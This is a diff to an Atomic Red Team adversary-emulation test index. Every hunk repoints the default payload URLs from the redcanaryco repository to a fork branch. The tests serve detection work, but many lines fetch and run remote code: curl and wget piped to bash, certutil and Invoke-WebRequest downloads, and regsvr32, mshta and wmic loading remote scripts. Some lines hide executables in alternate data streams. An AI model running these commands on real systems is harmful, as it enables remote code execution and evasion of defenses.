@@ -802,7 +802,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -829,7 +829,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -858,7 +858,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -7019,7 +7019,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -7046,7 +7046,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -7075,7 +7075,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -7964,7 +7964,7 @@ defense-evasion:
         remote_chm_file:
           description: Remote .chm payload
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1223/src/T1223.chm
       executor:
         name: command_prompt
         elevation_required: false
@@ -13005,7 +13005,7 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1170/src/mshta.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -13038,7 +13038,7 @@ defense-evasion:
         hta_url:
           description: URL to HTA file for execution
           type: string
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1170/src/T1170.hta
         temp_file:
           description: temp_file location for hta
           type: string
@@ -13156,7 +13156,7 @@ defense-evasion:
           type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
           extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
           findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
-          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\temp:ttt
+          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1096/src/test.ps1 c:\temp:ttt
           makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
           print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
           reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
@@ -14521,7 +14521,7 @@ defense-evasion:
         url:
           description: URL to hosted sct file
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1117/src/RegSvr32.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -14866,7 +14866,7 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1085/src/T1085.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -15582,7 +15582,7 @@ defense-evasion:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1216/src/T1216.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -16924,11 +16924,11 @@ defense-evasion:
         xmlfile:
           description: Remote location (URL) of the test XML file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1220/src/msxslxmlfile.xml
         xslfile:
           description: Remote location (URL) of the test XSL script file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1220/src/msxslscript.xsl
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -16980,7 +16980,7 @@ defense-evasion:
         remote_xsl_file:
           description: Remote location of an XSL payload.
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1220/src/wmicscript.xsl
       executor:
         name: command_prompt
         command: 'wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
@@ -22448,7 +22448,7 @@ discovery:
         prereq_command: 'if (Test-Path #{input_source_code}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{input_source_code}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "#{input_source_code}"
+          Invoke-WebRequest https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1010/src/T1010.cs -OutFile "#{input_source_code}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -28149,8 +28149,8 @@ execution:
       executor:
         name: sh
         command: |
-          curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash
-          wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash
+          curl -sS https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1059/echo-art-fish.sh | bash
+          wget --quiet -O - https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1059/echo-art-fish.sh | bash
         cleanup_command: 'rm /tmp/art-fish.txt
 
 '
@@ -28254,7 +28254,7 @@ execution:
         remote_chm_file:
           description: Remote .chm payload
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1223/src/T1223.chm
       executor:
         name: command_prompt
         elevation_required: false
@@ -29838,7 +29838,7 @@ execution:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1170/src/mshta.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -29871,7 +29871,7 @@ execution:
         hta_url:
           description: URL to HTA file for execution
           type: string
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1170/src/T1170.hta
         temp_file:
           description: temp_file location for hta
           type: string
@@ -30113,7 +30113,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1086/src/test.ps1
       executor:
         name: command_prompt
         elevation_required: false
@@ -30134,7 +30134,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1086/src/test.xml
       executor:
         name: command_prompt
         elevation_required: false
@@ -30155,7 +30155,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1086/src/mshta.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -30478,7 +30478,7 @@ execution:
         url:
           description: URL to hosted sct file
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1117/src/RegSvr32.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -30584,7 +30584,7 @@ execution:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1085/src/T1085.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -31483,7 +31483,7 @@ execution:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1216/src/T1216.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -32670,11 +32670,11 @@ execution:
         xmlfile:
           description: Remote location (URL) of the test XML file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1220/src/msxslxmlfile.xml
         xslfile:
           description: Remote location (URL) of the test XSL script file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1220/src/msxslscript.xsl
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -32726,7 +32726,7 @@ execution:
         remote_xsl_file:
           description: Remote location of an XSL payload.
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
+          default: https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1220/src/wmicscript.xsl
       executor:
         name: command_prompt
         command: 'wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
@@ -35069,7 +35069,7 @@ collection:
       executor:
         name: powershell
         elevation_required: false
-        command: 'Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat"
+        command: 'Invoke-WebRequest "https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1074/src/Discovery.bat"
           -OutFile #{output_file}
 
 '
@@ -35092,7 +35092,7 @@ collection:
           default: "/tmp/T1074_discovery.log"
       executor:
         name: bash
-        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh
+        command: 'curl -s https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1074/src/Discovery.sh
           | bash -s > #{output_file}
 
 '
